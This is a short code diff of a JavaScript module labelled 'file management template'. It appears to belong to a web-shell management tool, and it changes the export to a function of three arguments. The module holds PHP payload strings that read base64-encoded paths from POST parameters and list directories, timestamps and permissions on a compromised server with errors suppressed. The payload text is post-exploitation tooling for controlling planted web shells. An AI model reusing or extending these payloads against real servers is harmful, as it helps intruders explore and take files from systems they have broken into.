@@ -1,10 +1,8 @@
-// 
-// 文件管理模板
-// 
+/**
+ * 文件管理模板
+ */
 
-import { arg1, arg2, arg3 } from './argv';
-
-module.exports = {
+module.exports = (arg1, arg2, arg3) => ({
   dir: {
     _:
       `$D=base64_decode($_POST["${arg1}"]);$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}`,
@@ -76,4 +74,4 @@ module.exports = {
     [arg1]: "#{base64::url}",
     [arg2]: "#{base64::path}"
   }
-}
+})
